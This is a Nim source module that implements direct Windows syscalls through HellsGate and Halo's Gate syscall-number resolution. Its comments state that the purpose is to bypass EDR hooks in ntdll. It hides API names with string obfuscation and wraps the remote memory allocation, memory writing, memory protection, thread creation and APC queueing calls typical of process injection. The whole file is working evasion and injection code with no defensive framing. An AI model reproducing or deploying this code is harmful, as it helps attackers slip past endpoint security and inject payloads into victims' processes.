## Direct syscalls via HellsGate/Halo's Gate SSN resolution.
## NT function stubs (4C 8B D1 B8 <SSN> 0F 05 C3) are copied into a global
## buffer, patched with the resolved SSN, then VirtualProtected to RX.
## Calling a stub follows the standard Windows x64 ABI — the stub copies
## RCX into R10 and issues the syscall instruction directly, bypassing
## any EDR hooks installed in ntdll.dll userland stubs.
import crypto/strenc

when defined(windows) and defined(directSyscalls):
  type
    HANDLE   = int
    DWORD    = uint32
    LONG     = int32
    NTSTATUS = LONG
    LPVOID   = pointer
    SIZE_T   = uint
    BOOL     = int32

  const
    PAGE_READWRITE        = DWORD(0x04)
    PAGE_EXECUTE_READ     = DWORD(0x20)
    MEM_COMMIT            = DWORD(0x1000)
    MEM_RESERVE           = DWORD(0x2000)
    STUB_BYTES            = 11
    STUB_SLOT             = 16  # padded slot size for alignment
    # Stub indices
    IDX_ALLOC_VIRT_MEM    = 0
    IDX_WRITE_VIRT_MEM    = 1
    IDX_PROTECT_VIRT_MEM  = 2
    IDX_CREATE_THREAD_EX  = 3
    IDX_QUEUE_APC_EX      = 4
    NUM_STUBS             = 5

  proc GetModuleHandleA(n: cstring): HANDLE
    {.importc: "GetModuleHandleA", dynlib: "kernel32".}
  proc GetProcAddress(h: HANDLE, n: cstring): pointer
    {.importc: "GetProcAddress", dynlib: "kernel32".}
  proc VirtualProtect(a: LPVOID, sz: SIZE_T, prot: DWORD, old: ptr DWORD): BOOL
    {.importc: "VirtualProtect", dynlib: "kernel32".}

  # Stub buffer in .data (RW by default, VirtualProtected to RX after patching)
  var g_stubs {.global.}: array[NUM_STUBS * STUB_SLOT, byte]
  var g_syscallsReady {.global.} = false

  # Stub template: mov r10,rcx; mov eax,<SSN>; syscall; ret; nop*5
  const kStubTemplate: array[STUB_BYTES, byte] = [
    0x4C'u8, 0x8B, 0xD1,           # mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,  # mov eax, <SSN — patched at offset 4>
    0x0F, 0x05,                    # syscall
    0xC3                           # ret
  ]

  proc resolveSSN(name: string): DWORD =
    ## HellsGate: parse the NT stub for the syscall number.
    ## Halo's Gate: if the stub is hooked (no 4C 8B D1 B8), scan adjacent
    ## stubs (which are ~32 bytes apart) to infer the SSN by delta.
    result = DWORD(0xFFFFFFFF)
    let hNtdll = GetModuleHandleA(hidstr("ntdll.dll").cstring)
    if hNtdll == 0: return
    let fn = cast[ptr array[64, byte]](GetProcAddress(hNtdll, name.cstring))
    if fn == nil: return

    # Clean stub check: 4C 8B D1 B8
    if fn[0] == 0x4C and fn[1] == 0x8B and fn[2] == 0xD1 and fn[3] == 0xB8:
      result = cast[ptr DWORD](cast[int](fn) + 4)[]
      return

    # Halo's Gate: stub is patched/hooked — infer SSN from clean neighbors
    for delta in 1 .. 500:
      # Scan up (stubs with lower SSN, ~32 bytes before)
      let up = cast[ptr array[8, byte]](cast[int](fn) - delta * 32)
      if up[0] == 0x4C and up[1] == 0x8B and up[2] == 0xD1 and up[3] == 0xB8:
        result = cast[ptr DWORD](cast[int](up) + 4)[] + DWORD(delta)
        return
      # Scan down (stubs with higher SSN, ~32 bytes after)
      let dn = cast[ptr array[8, byte]](cast[int](fn) + delta * 32)
      if dn[0] == 0x4C and dn[1] == 0x8B and dn[2] == 0xD1 and dn[3] == 0xB8:
        result = cast[ptr DWORD](cast[int](dn) + 4)[] - DWORD(delta)
        return

  proc patchStub(idx: int, ssn: DWORD) =
    let base = idx * STUB_SLOT
    for i in 0 ..< STUB_BYTES:
      g_stubs[base + i] = kStubTemplate[i]
    # Patch SSN at bytes 4-7 of the stub (little-endian DWORD)
    g_stubs[base + 4] = byte(ssn and 0xFF)
    g_stubs[base + 5] = byte((ssn shr 8) and 0xFF)
    g_stubs[base + 6] = byte((ssn shr 16) and 0xFF)
    g_stubs[base + 7] = byte((ssn shr 24) and 0xFF)

  proc initSyscalls*() =
    if g_syscallsReady: return
    # Resolve all SSNs and patch stubs while buffer is still RW
    patchStub(IDX_ALLOC_VIRT_MEM,   resolveSSN(hidstr("NtAllocateVirtualMemory")))
    patchStub(IDX_WRITE_VIRT_MEM,   resolveSSN(hidstr("NtWriteVirtualMemory")))
    patchStub(IDX_PROTECT_VIRT_MEM, resolveSSN(hidstr("NtProtectVirtualMemory")))
    patchStub(IDX_CREATE_THREAD_EX, resolveSSN(hidstr("NtCreateThreadEx")))
    patchStub(IDX_QUEUE_APC_EX,     resolveSSN(hidstr("NtQueueApcThreadEx")))
    # Flip the stub buffer to PAGE_EXECUTE_READ (W^X: was RW, now RX)
    var oldProt: DWORD = 0
    discard VirtualProtect(cast[LPVOID](addr g_stubs[0]),
                           SIZE_T(NUM_STUBS * STUB_SLOT),
                           PAGE_EXECUTE_READ, addr oldProt)
    g_syscallsReady = true

  # ---------------------------------------------------------------------------
  # Direct syscall wrappers — cast stub slot to function pointer and call
  # ---------------------------------------------------------------------------

  type
    FnNtAllocVirtMem = proc(
      hProcess:    HANDLE,
      BaseAddress: ptr LPVOID,
      ZeroBits:    uint,
      RegionSize:  ptr SIZE_T,
      AllocType:   DWORD,
      Protect:     DWORD
    ): NTSTATUS {.stdcall.}

    FnNtWriteVirtMem = proc(
      hProcess:    HANDLE,
      BaseAddress: LPVOID,
      Buffer:      pointer,
      NumberOfBytesToWrite: SIZE_T,
      NumberOfBytesWritten: ptr SIZE_T
    ): NTSTATUS {.stdcall.}

    FnNtProtectVirtMem = proc(
      hProcess:        HANDLE,
      BaseAddress:     ptr LPVOID,
      RegionSize:      ptr SIZE_T,
      NewAccessProtect: DWORD,
      OldAccessProtect: ptr DWORD
    ): NTSTATUS {.stdcall.}

    FnNtCreateThreadEx = proc(
      ThreadHandle:      ptr HANDLE,
      DesiredAccess:     DWORD,
      ObjectAttributes:  pointer,
      ProcessHandle:     HANDLE,
      StartRoutine:      LPVOID,
      Argument:          LPVOID,
      CreateFlags:       DWORD,
      ZeroBits:          uint,
      StackSize:         SIZE_T,
      MaxStackSize:      SIZE_T,
      AttributeList:     pointer
    ): NTSTATUS {.stdcall.}

    FnNtQueueApcThreadEx = proc(
      ThreadHandle:       HANDLE,
      ReserveHandle:      HANDLE,
      ApcFlags:           DWORD,
      ApcRoutine:         LPVOID,
      SystemArgument1:    LPVOID,
      SystemArgument2:    LPVOID,
      SystemArgument3:    LPVOID
    ): NTSTATUS {.stdcall.}

  proc stubPtr(idx: int): pointer =
    cast[pointer](addr g_stubs[idx * STUB_SLOT])

  proc sysNtAllocVirtMem*(hProcess: HANDLE, baseAddr: ptr LPVOID,
                           zeroBits: uint, regionSz: ptr SIZE_T,
                           allocType: DWORD, protect: DWORD): NTSTATUS =
    cast[FnNtAllocVirtMem](stubPtr(IDX_ALLOC_VIRT_MEM))(
      hProcess, baseAddr, zeroBits, regionSz, allocType, protect)

  proc sysNtWriteVirtMem*(hProcess: HANDLE, baseAddr: LPVOID,
                           buf: pointer, sz: SIZE_T,
                           written: ptr SIZE_T): NTSTATUS =
    cast[FnNtWriteVirtMem](stubPtr(IDX_WRITE_VIRT_MEM))(
      hProcess, baseAddr, buf, sz, written)

  proc sysNtProtectVirtMem*(hProcess: HANDLE, baseAddr: ptr LPVOID,
                              sz: ptr SIZE_T, newProt: DWORD,
                              oldProt: ptr DWORD): NTSTATUS =
    cast[FnNtProtectVirtMem](stubPtr(IDX_PROTECT_VIRT_MEM))(
      hProcess, baseAddr, sz, newProt, oldProt)

  proc sysNtCreateThreadEx*(hThread: ptr HANDLE, access: DWORD,
                              hProcess: HANDLE, startAddr: LPVOID,
                              arg: LPVOID, flags: DWORD): NTSTATUS =
    cast[FnNtCreateThreadEx](stubPtr(IDX_CREATE_THREAD_EX))(
      hThread, access, nil, hProcess, startAddr, arg, flags,
      0, SIZE_T(0), SIZE_T(0), nil)

  proc sysNtQueueApcEx*(hThread: HANDLE, apcFlags: DWORD,
                         apcRoutine: LPVOID,
                         arg1: LPVOID = nil,
                         arg2: LPVOID = nil,
                         arg3: LPVOID = nil): NTSTATUS =
    cast[FnNtQueueApcThreadEx](stubPtr(IDX_QUEUE_APC_EX))(
      hThread, HANDLE(0), apcFlags, apcRoutine, arg1, arg2, arg3)
